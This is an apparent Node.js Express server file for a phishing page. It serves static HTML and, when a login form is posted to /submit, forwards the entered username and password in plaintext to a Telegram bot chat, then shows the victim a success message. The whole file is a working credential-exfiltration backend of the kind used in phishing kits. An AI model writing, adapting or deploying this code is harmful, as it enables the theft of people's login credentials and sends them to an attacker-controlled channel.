// server.js
const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch"); // to send requests to Telegram
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to read form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files (your HTML/CSS in public folder)
app.use(express.static(path.join(__dirname, "public")));

// Handle form submission
app.post("/submit", async (req, res) => {
  const { username, password } = req.body; // form fields

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const message = `🔐 Login attempt:\nUsername: ${username}\nPassword: ${password}`;

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
    res.send("✅ Form submitted successfully!");
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    res.status(500).send("❌ Error sending message");
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});